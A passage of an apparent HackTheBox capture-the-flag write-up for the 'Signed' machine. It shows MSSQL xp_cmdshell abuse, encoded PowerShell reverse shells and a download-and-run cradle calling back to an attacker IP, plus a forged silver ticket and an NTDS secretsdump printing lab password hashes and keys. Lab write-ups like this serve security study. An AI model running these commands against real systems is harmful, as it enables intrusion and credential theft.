[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');

-
1
```


### 1433 - Mssql : xp_cmdshell

Enable `xp_cmdshell`

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
[%] exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami"
[%] exec master..xp_cmdshell '"whoami"'
output
---------------
signed\mssqlsvc
NULL
```

Start reverse shell listener

```bash
rlwrap -cAr nc -lvnp 1111
```

Generate powershell revshell

> https://gist.github.com/opabravo/c352813852eb1ef83e8c74cde84c3711

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ python ~/scripts/windows/revshell_pwsh_public.py $(pt get lhost) 1111
powershell -nop -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAyACIALAAxADEAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Send reverse shell

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "powershell -nop -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAyACIALAAxADEAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
[%] exec master..xp_cmdshell '"powershell -nop -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAyACIALAAxADEAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.11.90] 56642
whoami
signed\mssqlsvc
PS C:\Windows\system32> cat C:\Users\mssqlsvc\Desktop\user.txt
33a57b20227550962f2115e01b98d907
```


# Root Flag
---

## Shell as Administrator


### 1433 - Mssql : Silver ticket

We can forge a service ticket to impersonate `mssqlsvc` as a group member of `Domain Admins`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ cat nxc_mssql_rid-brute.log | grep -i admin
2025-10-13 11:06:42 | mssql.py:427 - INFO - MSSQL       10.10.11.90     1433   DC01             500: SIGNED\Administrator
2025-10-13 11:06:42 | mssql.py:427 - INFO - MSSQL       10.10.11.90     1433   DC01             512: SIGNED\Domain Admins
2025-10-13 11:06:42 | mssql.py:427 - INFO - MSSQL       10.10.11.90     1433   DC01             518: SIGNED\Schema Admins
2025-10-13 11:06:42 | mssql.py:427 - INFO - MSSQL       10.10.11.90     1433   DC01             519: SIGNED\Enterprise Admins
2025-10-13 11:06:42 | mssql.py:427 - INFO - MSSQL       10.10.11.90     1433   DC01             526: SIGNED\Key Admins
2025-10-13 11:06:42 | mssql.py:427 - INFO - MSSQL       10.10.11.90     1433   DC01             527: SIGNED\Enterprise Key Admins
2025-10-13 11:06:43 | mssql.py:427 - INFO - MSSQL       10.10.11.90     1433   DC01             1101: SIGNED\DnsAdmins
```

Craft silver ticket

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ ticketer.py -domain 'SIGNED.htb' -domain-sid "S-1-5-21-4088429403-1159899800-2753317549" -user-id '1103' -groups '1105, 512' -spn 'mssqlsvc/DC01.SIGNED.HTB' mssqlsvc -duration 10 -aesKey 'B3E4580CFD006962CD759325391CCCC3CBDB7BE5128C170AEB4557023A948DB8'
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

Although `mssqlsvc`'s session can't execute commands as `Domain Admins`, but it can read files as `Domain Admins`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ KRB5CCNAME='mssqlsvc.ccache' mssqlclient.py -k DC01.SIGNED.htb
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> show_query
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
[%] exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "type C:\Users\Administrator\Desktop\root.txt"
[%] exec master..xp_cmdshell '"type C:\Users\Administrator\Desktop\root.txt"'
output
-----------------
Access is denied.
NULL
```

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt',SINGLE_CLOB) AS x;
[%] SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt',SINGLE_CLOB) AS x;
BulkColumn
---------------------------------------
b'85eb28452a0af846fdaeaeb3ad3ab9a3\r\n'
```

Powershell history file contains some users' password

```sql
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',SINGLE_CLOB) AS x;
```

![](/assets/obsidian/1f7478661794974cf17e0650c2a02774.png)

Use python to parse it

```bash
python
```

```python
x = """<RAW_CONTENT>
"""
print(x)
```

![](/assets/obsidian/4641245036d91e8d5b081749b60bf41b.png)

Use **runascs** to obtain a reverse shell as `administrator`

```bash
rlwrap -cAr nc -lvnp 1111
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ echo 'iex (new-object net.webclient).DownloadString("http://10.10.14.72:80/Invoke-RunasCs.ps1"); Invoke-RunasCs -Username "Administrator" -Password "Th1s889Rabb!t" -Command powershell.exe -Remote 10.10.14.72:1111' | iconv -f UTF-8 -t UTF-16LE | base64 -w0
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANwAyADoAOAAwAC8ASQBuAHYAbwBrAGUALQBSAHUAbgBhAHMAQwBzAC4AcABzADEAIgApADsAIABJAG4AdgBvAGsAZQAtAFIAdQBuAGEAcwBDAHMAIAAtAFUAcwBlAHIAbgBhAG0AZQAgACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAiACAALQBQAGEAcwBzAHcAbwByAGQAIAAiAFQAaAAxAHMAOAA4ADkAUgBhAGIAYgAhAHQAIgAgAC0AQwBvAG0AbQBhAG4AZAAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AUgBlAG0AbwB0AGUAIAAxADAALgAxADAALgAxADQALgA3ADIAOgAxADEAMQAxAAoA 
```

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "powershell -ep bypass -nop -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANwAyADoAOAAwAC8ASQBuAHYAbwBrAGUALQBSAHUAbgBhAHMAQwBzAC4AcABzADEAIgApADsAIABJAG4AdgBvAGsAZQAtAFIAdQBuAGEAcwBDAHMAIAAtAFUAcwBlAHIAbgBhAG0AZQAgACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAiACAALQBQAGEAcwBzAHcAbwByAGQAIAAiAFQAaAAxAHMAOAA4ADkAUgBhAGIAYgAhAHQAIgAgAC0AQwBvAG0AbQBhAG4AZAAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AUgBlAG0AbwB0AGUAIAAxADAALgAxADAALgAxADQALgA3ADIAOgAxADEAMQAxAAoA"
output
--------------------------------------------------------------------------------
#< CLIXML
NULL
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5e623$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1628 created in background.
NULL
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing
modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
SQL (SIGNED\mssqlsvc  dbo@master)>
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.11.90] 62498
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
signed\administrator
```


# Additional
---

## Post exploitation


### Secrets

```bash
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
C:\Windows\system32\ntdsutil.exe: activate instance ntds
Active instance set to "ntds".
C:\Windows\system32\ntdsutil.exe: ifm
ifm: create full C:\Windows\Temp\NTDS
Creating snapshot...
Snapshot set {8eff0239-7314-4567-b341-0245b8b6cfb2} generated successfully.
Snapshot {0529ce2d-2a3b-4987-bb01-2b690eb4de05} mounted as C:\$SNAP_202510171307_VOLUMEC$\
Snapshot {0529ce2d-2a3b-4987-bb01-2b690eb4de05} is already mounted.
Initiating DEFRAGMENTATION mode...
     Source Database: C:\$SNAP_202510171307_VOLUMEC$\Windows\NTDS\ntds.dit
     Target Database: C:\Windows\Temp\NTDS\Active Directory\ntds.dit

                  Defragmentation  Status (omplete)

          0    10   20   30   40   50   60   70   80   90  100
          |----|----|----|----|----|----|----|----|----|----|
          ...................................................

Copying registry files...
Copying C:\Windows\Temp\NTDS\registry\SYSTEM
Copying C:\Windows\Temp\NTDS\registry\SECURITY
Snapshot {0529ce2d-2a3b-4987-bb01-2b690eb4de05} unmounted.
IFM media created successfully in C:\Windows\Temp\NTDS
ifm: quit
C:\Windows\system32\ntdsutil.exe: quit
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ pt set session "$(ssh 127.0.0.1 -p 443 ls | decolor | grep "$(pt get ip)" | sort -n -t ':' -k2 | tail -n1 | awk '{print $1}')"

┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ scp -J 127.0.0.1:443 -r "$(pt get session)":"$(FILE="C:\Windows\Temp\NTDS"; echo "${FILE//\\//}")" ./loot/
Warning: Permanently added '75eb2e0d74a53d43e3720b70a805c74badca04cc' (ED25519) to the list of known hosts.
ntds.dit                                                                                                                                                                       100%   24MB 410.1KB/s   00:59
ntds.jfm                                                                                                                                                                       100%   16KB  28.7KB/s   00:00
SECURITY                                                                                                                                                                       100%   64KB 115.8KB/s   00:00
SYSTEM       
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Signed]
└─$ secretsdump.py -ntds loot/NTDS/Active\ Directory/ntds.dit -system loot/NTDS/registry/SYSTEM -security loot/NTDS/registry/SECURITY LOCAL -outputfile secretsdump -history
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xad7915b8e6d4f9ee383a5176349739e3
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:86ea5da16ce54873aebc97ccc27549d3130d183d1cca4fcddbab089b15897b7a81078abbb8a2e582067a0919d5702c07810516378efc648e3d0b3eec80c508b70d47047c8292e77065ccf651ca57c198afaca8568fc4283158e4147499a7a26963df297191553110fe7193db607f47c335d0da570cb7281a375f26b7304c128f6808c2ad6b7ea696205e8ef2a16ddf9539b520e79aa9437a729d5f8e80bbd6fa2eb3d2da4092cd478f71b4d1ae5976fb38a863a43e2abc29a01e3c60fd2a992bcdf6554bc070dd4efd90f7ab7db606a6e6d8adc2113976d1c3f8754e84a1c84233bcb211c4e9d8c97ff7feb3468426e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:91d90e085c72770d23228f1b5dabaa23
[*] $MACHINE.ACC_history
$MACHINE.ACC:plain_password_hex:a964a9cf2dd9549db9f37cfa6fdb2aa4624f316b59351395f422b947bc39cc347221db5c377e6c95640056a73d1358ee00d4f4031c2f486c20c0a85ad1571d7430b12e9021d8c01de25ae5526e64d2361ae79841151016356ec0ed119cb3341dd033ba08a3cf7be63832b8889e8689b37fa3df78e6fe4d6e55b0763dece27152ba5944d17b8075d918fccb98f95df6c591068b70d485a84cc6509138af8567908b0f728014174b35f4adc4d32977ab8f2b4a3d342b98229f58a765ea938c1d40310766a175b0f3dfff6ead4cdd88457b3d6e3af7fe58f84ac058efb90975fe94fa3a209590d4fa703066b061659dcbc3c47f9335eaff5b8150f1b692bbe9a398845105ce443ab52bdda9e9faf6dd0d08584832d85b1706b0c470b37f3e58cba4f56f94874fc559bbf4390d0297fc1bde9f2757483d5f9b2ff2409ac351a9f9edec26b08d3e42528795e7f79e604703b350ab586ba56d30c4cbb3a51f7ee21e3eb1334caa14f2b465721c26ad99af98f9b49f6bc8d58fc3e40fac7735cd550e487ae5c456660bf6d55f1ece3055f5b353aae84c9fd51ca4a49cf887f415989dac7bd215ef63cceeeb5c39e098b9844326108da0f03b204b97995f3f6d80eabfa68d534fc03812f8eecc51f003bf7faffab652b589e28999f1f79d4a92b50ee287e9a1c6af6563796880c00077fc08cc9c20cfe8a6afd469f9ca35ae0f1ab96ccc
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:998f596b8701b7702f7d357c1eb1886c
[*] DPAPI_SYSTEM
dpapi_machinekey:0xee3ee8172d485d91d928e75a6199a2d9d1552d2a
dpapi_userkey:0x872350e7691cd1f10c04962e21f42f7921a64796
[*] DPAPI_SYSTEM_history
dpapi_machinekey:0x125aae067d791ae8cc3f482d7c714839105d9ab1
dpapi_userkey:0xb9d46a39db3ff398f4ed3902a4726221c4f94fae
[*] NL$KM
 0000   4D 9A AB A3 5A 7A 2F 50  25 FC 83 1A 10 FE 1E A5   M...Zz/P%.......
 0010   D3 B9 9D A8 B5 4E EB 60  2B D6 78 53 7B 73 2A E0   .....N.`+.xS{s*.
 0020   44 A8 77 0C 48 36 37 26  80 D0 2C 90 D4 16 AA E5   D.w.H67&..,.....
 0030   66 53 4B 7F A9 2D 50 99  8A 26 0A 20 40 0D 9B E1   fSK..-P..&. @...
NL$KM:4d9aaba35a7a2f5025fc831a10fe1ea5d3b99da8b54eeb602bd678537b732ae044a8770c4836372680d02c90d416aae566534b7fa92d50998a260a20400d9be1
[*] NL$KM_history
 0000   4D 9A AB A3 5A 7A 2F 50  25 FC 83 1A 10 FE 1E A5   M...Zz/P%.......
 0010   D3 B9 9D A8 B5 4E EB 60  2B D6 78 53 7B 73 2A E0   .....N.`+.xS{s*.
 0020   44 A8 77 0C 48 36 37 26  80 D0 2C 90 D4 16 AA E5   D.w.H67&..,.....
 0030   66 53 4B 7F A9 2D 50 99  8A 26 0A 20 40 0D 9B E1   fSK..-P..&. @...
NL$KM_history:4d9aaba35a7a2f5025fc831a10fe1ea5d3b99da8b54eeb602bd678537b732ae044a8770c4836372680d02c90d416aae566534b7fa92d50998a260a20400d9be1
[*] _SC_MSSQLSERVER
(Unknown User):purPLE9795!@
[*] _SC_SQLSERVERAGENT
(Unknown User):purPLE9795!@
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: ad4c00425ea642c175b9f951f043cd20
[*] Reading and decrypting hashes from loot/NTDS/Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:62a34972744e3c2e078677e0c177c823:::
Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:91d90e085c72770d23228f1b5dabaa23:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e66dab342f64c9a323012d62cd786de1:::
krbtgt_history0:502:aad3b435b51404eeaad3b435b51404ee:b5ca59b606a13445af2043409d2c0086:::
SIGNED.HTB\mssqlsvc:1103:aad3b435b51404eeaad3b435b51404ee:ef699384c3285c54128a3ee1ddb1a0cc:::
SIGNED.HTB\mssqlsvc_history0:1103:aad3b435b51404eeaad3b435b51404ee:c63407eac237a49a7e559f453cc6a4df:::
signed.htb\oliver.mills:1109:aad3b435b51404eeaad3b435b51404ee:21d4dcaeb62cb577227094aa72dab5f3:::
signed.htb\oliver.mills_history0:1109:aad3b435b51404eeaad3b435b51404ee:debb23e05fd06a2233e03b6e5d1b764f:::
signed.htb\emma.clark:1110:aad3b435b51404eeaad3b435b51404ee:0ba359ab587d350c644de9c3145d8668:::
signed.htb\emma.clark_history0:1110:aad3b435b51404eeaad3b435b51404ee:8589f80ed59bd715193c9e6de4c4e7fe:::
signed.htb\liam.wright:1111:aad3b435b51404eeaad3b435b51404ee:6e46f64af0398d58eaa71c87fd54f6b2:::
signed.htb\liam.wright_history0:1111:aad3b435b51404eeaad3b435b51404ee:a2175f1ce9d3b0db0245d6d940e08706:::
signed.htb\noah.adams:1112:aad3b435b51404eeaad3b435b51404ee:d48af06d555bbae68c58efe47bcd2c0d:::
signed.htb\noah.adams_history0:1112:aad3b435b51404eeaad3b435b51404ee:d82b04357447ef74a9a5ca55af536bb1:::
signed.htb\ava.morris:1113:aad3b435b51404eeaad3b435b51404ee:2c8313bbe020fb9e208fb6f933c3623f:::
signed.htb\ava.morris_history0:1113:aad3b435b51404eeaad3b435b51404ee:f725692c16321f8b6f67c63242a27295:::
signed.htb\sophia.turner:1114:aad3b435b51404eeaad3b435b51404ee:71a04f69295d7c7a4f36b864d0a01cad:::
signed.htb\sophia.turner_history0:1114:aad3b435b51404eeaad3b435b51404ee:a08e762d9ddbe3805e7b267ec52e330f:::
signed.htb\james.morgan:1115:aad3b435b51404eeaad3b435b51404ee:0813fe8852c857e961ca1d65b20a95f9:::
signed.htb\james.morgan_history0:1115:aad3b435b51404eeaad3b435b51404ee:c6fdb32b728e771c9c847ff3682fe183:::
signed.htb\mia.cooper:1116:aad3b435b51404eeaad3b435b51404ee:9cc5251ebf86225e53a9bcac8adf1842:::
signed.htb\mia.cooper_history0:1116:aad3b435b51404eeaad3b435b51404ee:f09dbf15d2ed36aefe751e9f6300eb75:::
signed.htb\elijah.brooks:1117:aad3b435b51404eeaad3b435b51404ee:89b1e2dc085e7a9e35d64aced32835e8:::
signed.htb\elijah.brooks_history0:1117:aad3b435b51404eeaad3b435b51404ee:c86bb00e7b60a06e832810127e6d24c2:::
signed.htb\isabella.evans:1118:aad3b435b51404eeaad3b435b51404ee:c4874b2cc244102dbede7997fdfcc443:::
signed.htb\isabella.evans_history0:1118:aad3b435b51404eeaad3b435b51404ee:6fc4c14b4b07ef5dc84d6078348069ff:::
signed.htb\lucas.murphy:1119:aad3b435b51404eeaad3b435b51404ee:9e488a69fba0e675bde844c2359176c9:::
signed.htb\lucas.murphy_history0:1119:aad3b435b51404eeaad3b435b51404ee:e274584c8622f07d8d973379a2e41cfb:::
signed.htb\william.johnson:1120:aad3b435b51404eeaad3b435b51404ee:b5cdbf491a0a3fd27f7d78e57ecd3a01:::
signed.htb\william.johnson_history0:1120:aad3b435b51404eeaad3b435b51404ee:710f0165cbde2e327429db1aac87273a:::
signed.htb\charlotte.price:1121:aad3b435b51404eeaad3b435b51404ee:7b2351de0ebd879b285a391cd22da871:::
signed.htb\charlotte.price_history0:1121:aad3b435b51404eeaad3b435b51404ee:afc228f8dfdcb5f841979955fd93d9f3:::
signed.htb\henry.bennett:1122:aad3b435b51404eeaad3b435b51404ee:f368d7adbfcdd0690f91304ea0d81b6d:::
signed.htb\henry.bennett_history0:1122:aad3b435b51404eeaad3b435b51404ee:02bcfda0bffc6dd912b7ddff3b51ba89:::
signed.htb\amelia.kelly:1123:aad3b435b51404eeaad3b435b51404ee:3f817cb56c6985322d68e753d4931fde:::
signed.htb\amelia.kelly_history0:1123:aad3b435b51404eeaad3b435b51404ee:6360fd90d6a9786e9be03506c40275d6:::
signed.htb\jackson.gray:1124:aad3b435b51404eeaad3b435b51404ee:e55da171150de5fdbf3a69cda4c29944:::
signed.htb\jackson.gray_history0:1124:aad3b435b51404eeaad3b435b51404ee:1d64e479fdfb7f30f1e85d70ae4cc7b4:::
signed.htb\harper.diaz:1125:aad3b435b51404eeaad3b435b51404ee:7cd44096ab804dcbf4da88b0becd86d8:::
signed.htb\harper.diaz_history0:1125:aad3b435b51404eeaad3b435b51404ee:e0a58c18ef69f4100055a2e739b79671:::
[*] Kerberos keys from loot/NTDS/Active Directory/ntds.dit
Administrator:aes256-cts-hmac-sha1-96:e57c6a88f0df006c914773f684081eea27ac5167003557a09367a5bd2153da28
Administrator:aes128-cts-hmac-sha1-96:a307daf386ac9c76778cd15f042c9466
Administrator:des-cbc-md5:1373f751adb0586e
